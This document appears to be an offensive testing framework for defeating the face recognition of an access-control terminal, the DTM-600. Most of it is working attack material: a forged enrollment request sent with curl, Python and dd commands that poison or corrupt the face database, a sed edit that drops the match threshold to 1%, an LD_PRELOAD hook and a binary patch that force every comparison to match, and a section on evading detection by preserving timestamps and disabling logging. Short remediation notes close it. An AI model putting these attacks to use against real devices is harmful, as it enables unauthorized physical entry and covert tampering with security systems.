# DTM-600 Face Recognition Bypass & Poisoning Framework

**Focus:** Camera capture manipulation, authentication bypass, template poisoning
**Goal:** Accept wrong face as authorized, or enroll "universal" face that matches everyone

---

## 1. The Core Vulnerability Hypothesis

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    FACE RECOGNITION DECISION FLOW                           │
│                                                                             │
│   Camera Input → Feature Extraction → Template Matching → Access Decision   │
│       ↑              (256-dim)           (cosine sim)        (≥82%)        │
│       │                  │                    │                             │
│   ATTACK 1           ATTACK 2             ATTACK 3                          │
│   Present fake       Shift features       Poison stored                     │
│   image as real      toward target        templates                         │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Key insight from config analysis:**
- Similarity threshold: `MultipleValue=82` (82%)
- Liveness: **DISABLED** by default (`Enable=0`)
- No photo/screen detection mentioned in capabilities
- Feature vector: 256 dimensions, version 10041000

---

## 2. Attack Category A: Presentation Attacks (Show Wrong Face, Get Accepted)

### A1: Basic Photo Attack (Liveness Disabled)

Since `FaceLivingAnalysis.Enable=0`, the device accepts 2D images.

```
Simple test:
1. Enroll legitimate user "Alice" via normal process
2. Print high-quality photo of Alice's face
3. Present photo to camera
4. Expected: Access granted as "Alice"

Requirements:
- Photo resolution: ≥1080p print or display
- Face size in frame: Match enrollment distance
- Lighting: Consistent with enrollment conditions
- Angle: Frontal, matching enrollment pose
```

### A2: Screen/Display Presentation

```
Setup:
┌─────────────────────────────────────────────────────────────────┐
│  [Phone/Tablet Display]  ←── 30-50cm ──→  [DTM-600 Camera]     │
│                                                                 │
│  Display shows:                                                 │
│  - Static photo of enrolled user                                │
│  - Video loop of enrolled user                                  │
│  - Morphed face (attacker → target blend)                      │
└─────────────────────────────────────────────────────────────────┘

Variables to test:
- Display brightness: 50% - 100%
- Display refresh rate: 60Hz, 120Hz, 144Hz
- Image format: JPEG, PNG (compression artifacts?)
- Video vs static: Does motion help or hurt?
```

### A3: Morphed Face Attack

```
Theory: Blend attacker face with enrolled user face
        Result accepted as enrolled user due to feature averaging

Process:
1. Get photo of enrolled user (target)
2. Get photo of attacker
3. Use face morphing tool (FaceMorpher, OpenCV)
4. Create 50/50 blend at landmark level
5. Present morphed image to camera

┌─────────────────────────────────────────────────────────────────┐
│   Attacker Face     +     Target Face     =    Morphed Face    │
│       (0%)                  (100%)              (50/50)        │
│                                                                 │
│   Feature distance from target: ~15-25% (within 82% threshold) │
└─────────────────────────────────────────────────────────────────┘

Morph ratio sweep:
- 70% target / 30% attacker → likely pass
- 60% target / 40% attacker → borderline
- 50% target / 50% attacker → test threshold
```

### A4: Adversarial Perturbation Attack

```
Theory: Add invisible noise to attacker's face that shifts
        extracted features toward target's feature vector

Steps:
1. Extract target's feature vector (need: enrolled template or photo)
2. Extract attacker's feature vector
3. Compute gradient to shift attacker → target in feature space
4. Apply perturbation to attacker's image
5. Present perturbed image

Implementation approach:

# Pseudocode for adversarial face generation
def generate_adversarial_face(attacker_img, target_features, model):
    """
    attacker_img: Attacker's face image
    target_features: 256-dim feature vector of enrolled user
    model: Face recognition model (faceRec_4110_fc256)
    """
    perturbed = attacker_img.copy()

    for iteration in range(1000):
        # Forward pass
        current_features = model.extract_features(perturbed)

        # Loss: distance from target features
        loss = cosine_distance(current_features, target_features)

        # Backward pass
        gradient = compute_gradient(loss, perturbed)

        # Update with small perturbation
        perturbed = perturbed - epsilon * sign(gradient)

        # Clamp to valid image range
        perturbed = clip(perturbed, 0, 255)

        if cosine_similarity(current_features, target_features) > 0.82:
            return perturbed  # Success!

    return perturbed

Challenge: Need model weights or black-box query access
Solution: Use extracted model files from /program/factory/models/model/
```

---

## 3. Attack Category B: Enrollment Poisoning (Corrupt the Database)

### B1: Universal Template Attack

```
Theory: Enroll a face template that has high similarity to ALL faces
        Anyone presenting their face matches this "universal" template

Mathematical basis:
- 256-dimensional feature space
- Similarity = cosine(v1, v2)
- Find vector V such that cosine(V, any_face) > 0.82

Approach 1: Centroid of face distribution
┌─────────────────────────────────────────────────────────────────┐
│  Collect 10,000 diverse face feature vectors                    │
│  Compute centroid: V_universal = mean(all_vectors)              │
│  This centroid is "averagely similar" to all faces              │
│                                                                  │
│  Problem: Centroid similarity typically ~60-70%, below 82%      │
│  Solution: Use weighted mean biased toward common faces         │
└─────────────────────────────────────────────────────────────────┘

Approach 2: Adversarial universal perturbation
┌─────────────────────────────────────────────────────────────────┐
│  Train a "master face" image that:                              │
│  - Passes quality checks                                         │
│  - Passes liveness (if enabled)                                  │
│  - Has feature vector similar to many enrolled users            │
│                                                                  │
│  Research: "Master Face" paper (2021) achieved ~40% match rate  │
│  On this device: 82% threshold may be more vulnerable           │
└─────────────────────────────────────────────────────────────────┘

Approach 3: Enroll edge-case features
┌─────────────────────────────────────────────────────────────────┐
│  Exploit: What if enrolled feature vector is all zeros?         │
│  Exploit: What if enrolled feature vector is all ones?          │
│  Exploit: What if enrolled feature vector is NaN/Inf?           │
│                                                                  │
│  Test: Directly modify /data/WorkLibFile/3/FeatureLib.bin       │
│  Inject: [0,0,0,...,0] or [1,1,1,...,1] or [NaN,NaN,...]        │
│  Observe: How does comparison function handle these?            │
└─────────────────────────────────────────────────────────────────┘
```

### B2: Enrollment via Manipulated Image

```
Theory: Enroll a specially crafted image that stores corrupted features

Attack flow:
1. Create image that looks like Face A to humans
2. But extracts as features similar to Face B (or universal)
3. Enroll this image as "legitimate user"
4. Face B (or anyone) can now authenticate as that user

Implementation:
┌─────────────────────────────────────────────────────────────────┐
│  Visual appearance:  Alice's face                               │
│  Extracted features: Similar to [Bob, Charlie, Dave, ...]       │
│                                                                  │
│  Created by:                                                     │
│  1. Start with Alice's photo                                    │
│  2. Add adversarial perturbation toward multiple targets        │
│  3. Perturbation invisible to humans, detected by model         │
│  4. Enroll this "Alice" image                                   │
│  5. Bob, Charlie, Dave can now access as "Alice"                │
└─────────────────────────────────────────────────────────────────┘
```

### B3: Database Direct Manipulation

```
Since we have root access, directly poison the face database:

Target files:
/data/WorkLibFile/AllLibInfo.bin      # Library metadata
/data/WorkLibFile/3/LibKeyInfo.bin    # Employee lib info
/data/WorkLibFile/3/FeatureLib.bin    # Actual feature vectors (if exists)

Attack 1: Replace all features with constant vector
───────────────────────────────────────────────────
# On device via root shell:
cd /data/WorkLibFile/3

# Backup
cp FeatureLib.bin FeatureLib.bin.bak

# Create feature file where all entries are identical
# Every enrolled face now has same features
# Similarity between any face and any enrolled = varies
python3 -c "
import struct
# 256 floats, all 0.5 (normalized)
universal = [0.0625] * 256  # Magnitude = 1.0
feature_bytes = struct.pack('256f', *universal)
# Write for 100 enrolled faces
with open('FeatureLib.bin', 'wb') as f:
    for i in range(100):
        f.write(feature_bytes)
"

Attack 2: Zero out specific fields to break comparison
───────────────────────────────────────────────────────
# Corrupt the feature dimension count in header
# Model expects 256-dim, header says 512-dim
# Comparison function may read garbage or crash

dd if=/dev/zero of=LibKeyInfo.bin bs=1 count=4 seek=8 conv=notrunc

Attack 3: Integer overflow in entry count
─────────────────────────────────────────
# Set entry count to 0xFFFFFFFF
# Comparison loop may overflow, skip checks, or crash

printf '\xFF\xFF\xFF\xFF' | dd of=AllLibInfo.bin bs=1 seek=4 conv=notrunc
```

---

## 4. Attack Category C: Capture Manipulation (Corrupt What Gets Stored)

### C1: Enrollment Image Injection

```
Theory: During enrollment, inject different image than what camera sees

If enrollment is via API (LAPI port 80):

POST /LAPI/V1.0/PeopleLibraries/3/People HTTP/1.1
Content-Type: application/json

{
  "PersonInfo": {
    "PersonID": "attacker001",
    "PersonName": "Legitimate User",
    "TimeTemplate": {"TemplateID": 0}
  },
  "FaceInfo": {
    "FaceID": 1,
    "FaceData": "<base64 of DIFFERENT person's face>"
  }
}

Result:
- System thinks "Legitimate User" is enrolled
- But stored features are from attacker's face
- Attacker can now authenticate as "Legitimate User"
```

### C2: Frame Buffer Interception

```
Theory: Intercept frame going to feature extraction, replace with different image

Via root shell, locate frame buffer in memory:

# Find mwareserver memory mappings
cat /proc/$(pidof mwareserver)/maps | grep -i heap

# Locate frame buffer structure (need reverse engineering)
# Typically: pointer to pixel data, width, height, stride

# Hook/replace frame data before NNIE processing
# Tools: LD_PRELOAD with custom library, or direct memory patching

Proof of concept structure:
┌─────────────────────────────────────────────────────────────────┐
│  1. Camera captures Frame A (attacker's face)                   │
│  2. Frame A placed in buffer at address 0xNNNNNNNN              │
│  3. OUR CODE: Replace buffer contents with Frame B (target)     │
│  4. NNIE processes Frame B, extracts target's features          │
│  5. System stores target's features as "attacker's enrollment"  │
│  6. Attacker now matches as target                              │
└─────────────────────────────────────────────────────────────────┘
```

### C3: Model Output Interception

```
Theory: Don't modify input, modify the extracted features directly

Hook point: After faceRec_4110_fc256 model, before storage/comparison

# Intercept feature extraction output
# HI_SVPRT_RUNTIME_ForwardGroupSync() returns feature tensor
# Modify tensor before it reaches comparison logic

Approach via LD_PRELOAD:

// hook_features.c
#define _GNU_SOURCE
#include <dlfcn.h>

// Hook the NNIE forward function
int HI_SVPRT_RUNTIME_ForwardGroupSync(...) {
    // Call original
    int ret = original_forward(...);

    // Locate output tensor (feature vector)
    float* features = get_output_tensor(...);

    // Replace with target features
    memcpy(features, target_features, 256 * sizeof(float));

    return ret;
}

// Compile and inject:
// gcc -shared -fPIC -o hook.so hook_features.c -ldl
// LD_PRELOAD=/tmp/hook.so /program/bin/mwareserver
```

---

## 5. Attack Category D: Threshold/Logic Bypass

### D1: Similarity Threshold Manipulation

```
Config location: /config/config_a.xml

Current threshold: MultipleValue=82 (82% similarity required)

Attack: Lower threshold to accept anyone

# Via root shell:
mount -o remount,rw /config

# Edit config to set threshold to 1%
sed -i 's/<MultipleValue>82</<MultipleValue>1</g' /config/config_a.xml

# Restart mwareserver or reboot
killall mwareserver
/program/bin/mwareserver &

# Now ANY face matches enrolled users (1% similarity = always pass)
```

### D2: Bypass Comparison Entirely

```
Theory: Patch mwareserver to always return "match found"

# Disassemble mwareserver, find comparison function
# Likely contains: if (similarity > threshold) { grant_access(); }

# Find the conditional branch instruction
# Patch to unconditional jump (always grant)

# Using binary patching via dd:
# (Requires finding exact offset - use Ghidra/IDA)

# Example ARM patch: BNE → B (conditional to unconditional)
# BNE = 0x1A, B = 0xEA
# dd if=/dev/zero of=/program/bin/mwareserver bs=1 count=1 seek=OFFSET conv=notrunc
# printf '\xEA' | dd of=/program/bin/mwareserver bs=1 seek=OFFSET conv=notrunc
```

### D3: Return Value Manipulation

```
Theory: Hook comparison function to always return success

Target function (from strings): likely in libFaceAnalyzeSystemAPI.so

// hook_compare.c
float face_compare(float* features1, float* features2, int dim) {
    // Ignore actual comparison, return high similarity
    return 0.99f;  // 99% similarity = always match
}

// Or more subtle: boost by 20%
float face_compare_hook(float* f1, float* f2, int dim) {
    float real_sim = original_compare(f1, f2, dim);
    return real_sim + 0.20f;  // Boost similarity by 20%
}
```

---

## 6. Practical Test Sequences

### Test 1: Photo Presentation (No Code Required)

```
Materials: Phone with enrolled user's photo

Steps:
1. Enroll your face normally as "Test User"
2. Get a clear photo of a different person
3. Display photo on phone, present to camera
4. Observe: Does it reject (expected) or accept (vulnerable)?

If accepted → Basic liveness is truly disabled/broken
If rejected → May have basic screen detection
```

### Test 2: Threshold Discovery

```
Goal: Find exact similarity threshold through binary search

# Create test enrollment
# Then present progressively dissimilar faces

Process:
1. Enroll Face A
2. Create morphs: 100% A, 90% A + 10% B, 80% A + 20% B, ...
3. Present each morph, record accept/reject
4. Find cutoff point = actual threshold

Expected: Cutoff around 82% based on config
Actual: May differ due to implementation quirks
```

### Test 3: Database Poisoning

```
Goal: Create enrollment that matches multiple people

# On device via root shell:

# 1. Backup current database
cp -r /data/WorkLibFile /data/WorkLibFile.bak

# 2. Find or create "average face" image
# Option A: Use average of multiple faces
# Option B: Use generated "master face"

# 3. Enroll this average face via web UI or API
curl -X POST http://192.168.30.178/LAPI/V1.0/PeopleLibraries/3/People \
  -H "Content-Type: application/json" \
  -d '{
    "PersonInfo": {"PersonID": "universal", "PersonName": "Universal User"},
    "FaceInfo": {"FaceData": "'$(base64 -w0 average_face.jpg)'"}
  }'

# 4. Test with multiple different faces
# Each should match "Universal User" if poisoning worked
```

### Test 4: Feature Vector Injection

```
Goal: Directly write feature vector that matches everyone

# 1. Extract existing feature vectors for analysis
cat /data/WorkLibFile/3/FeatureLib.bin | xxd | head -100

# 2. Analyze feature distribution
# (Copy file to host for analysis with Python/NumPy)

# 3. Compute universal vector (centroid or optimized)
python3 << 'EOF'
import numpy as np
import struct

# Load all feature vectors
with open('FeatureLib.bin', 'rb') as f:
    data = f.read()

# Parse 256-float vectors
n_vectors = len(data) // (256 * 4)
vectors = []
for i in range(n_vectors):
    offset = i * 256 * 4
    v = struct.unpack('256f', data[offset:offset+256*4])
    vectors.append(v)

vectors = np.array(vectors)

# Compute centroid
centroid = vectors.mean(axis=0)
centroid = centroid / np.linalg.norm(centroid)  # Normalize

# Check similarity to all vectors
similarities = vectors @ centroid
print(f"Min similarity: {similarities.min():.3f}")
print(f"Max similarity: {similarities.max():.3f}")
print(f"Mean similarity: {similarities.mean():.3f}")

# Save universal vector
with open('universal_vector.bin', 'wb') as f:
    f.write(struct.pack('256f', *centroid))
EOF

# 4. Inject universal vector as new enrollment
# (Requires understanding exact file format)
```

### Test 5: Live Feature Extraction Attack

```
Goal: Extract target's features, then craft image that produces same features

# This requires model access - we have the model files

# 1. Set up inference environment (on host with ARM emulation or similar HiSilicon board)
# 2. Load faceRec_4110_fc256_Model_r37_3516x
# 3. Extract features from target's photo
# 4. Use gradient descent to create adversarial image:
#    - Start with attacker's face
#    - Iteratively modify pixels
#    - Goal: extracted features match target's features
# 5. Print/display resulting adversarial image
# 6. Present to camera
```

---

## 7. Expected Results & Severity

| Attack | Success Likelihood | Impact | Detectability |
|--------|-------------------|--------|---------------|
| Photo presentation | HIGH (liveness off) | Auth bypass | Low |
| Morphed face | MEDIUM-HIGH | Auth bypass | Very low |
| Adversarial perturbation | MEDIUM | Auth bypass | Very low |
| Universal template | LOW-MEDIUM | Mass bypass | Medium |
| Database poisoning | HIGH (need root) | Complete bypass | Low |
| Threshold manipulation | HIGH (need root) | Complete bypass | Medium |
| Feature injection | MEDIUM | Targeted bypass | Low |

---

## 8. Detection Evasion

To avoid triggering alerts or logs:

```
1. Presentation attacks:
   - Use matte screen protector (reduce glare detection)
   - Match lighting conditions of enrollment
   - Present at same distance as normal use

2. Database attacks:
   - Modify during off-hours
   - Preserve file timestamps: touch -r original modified
   - Disable logging temporarily: mount -o remount,ro /data

3. Config attacks:
   - Create config that appears normal to casual inspection
   - Only modify threshold values, not structure
   - Test in isolated environment first
```

---

## 9. Remediation Observations

If testing reveals these vulnerabilities, recommend:

1. **Enable liveness detection** - Currently disabled by default
2. **Increase similarity threshold** - 82% may be too permissive
3. **Add screen/print detection** - IR reflectance analysis
4. **Sign feature database** - Detect tampering
5. **Integrity check model files** - Prevent model corruption
6. **Rate limit enrollment API** - Prevent mass poisoning
7. **Audit logging** - Track all access attempts and config changes
